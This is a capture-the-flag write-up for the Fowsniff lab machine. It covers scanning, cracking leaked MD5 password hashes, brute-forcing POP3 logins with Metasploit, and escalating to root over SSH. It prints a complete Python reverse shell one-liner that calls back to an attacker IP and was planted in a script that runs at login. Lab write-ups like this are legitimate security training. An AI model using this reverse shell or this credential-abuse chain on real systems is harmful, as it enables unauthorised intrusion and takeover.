# Fowsniff CTF

I started by doing a nmap scan:

![nmap.png](/images/reports/fowsniff_ctf/nmap.png)

Then I performed a gobuster search scan:

![gobuster.png](/images/reports/fowsniff_ctf/gobuster.png)

I didn’t get anything interesting from gobuster, but the box gives us a list of intructions we have to follow. So first I needed to search online for the Fowsniff Corp to look for any leaked data on the internet, and the first link gave me the answer:

![leak.png](/images/reports/fowsniff_ctf/leak.png)

Here we have the leaked emails and passwords for this company’s employees. Next we need to crack the passwords, we can see from the format and also from the box instructions that these are MD5 hashes, perfect for unhashing. I went to Crackstation and I got these results:

![hashes.png](/images/reports/fowsniff_ctf/hashes.png)

It appears that for the user stone it didn’t unhashes it’s password. 

The next step in the instructions is to attempt to login into the pop3 service using metasploit and the credentials we found. 

Now in the hint we get the information to use the module /auxiliary/scanner/pop3/pop3_login to bruteforce the credentials we found agains the pop3 service. After setting the options RHOSTS and the USERPASS_FILE we can run the script and we get this:

![pop3_login.png](/images/reports/fowsniff_ctf/pop3_login.png)

We got a hit for the user seina.

So now we log into seina pop3 account:

![connect pop3.png](/images/reports/fowsniff_ctf/connect_pop3.png)

We can see 2 messages, the first one looks like this:

![first message.png](/images/reports/fowsniff_ctf/first_message.png)

And from here we get our answer for the temporary password.

Now we are prompted to login into SSH with the found password and the sender’s username.

Apparently the user for the SSH login isn’t stone like it says, it’s baksteen. 

Next, I needed to check in which group does baksteen belong to, and if there is a file that I can take advantage for privilege escalation, the group is called ‘users’ and we can search for file that can be executed by the group, one of the them stands out:

![script.png](/images/reports/fowsniff_ctf/script.png)

Next I added the following python reverse shell inside the cube.sh:

`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.91.64",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);’`

Then we can check inside /etc/update-motd.d/00-header to see that the [cube.sh](http://cube.sh) script is executed on someone logs into SSH. So after putting the reverse shell we need to logout and login again to trigger the reverse shell:

![root.png](/images/reports/fowsniff_ctf/root.png)

And we got root access.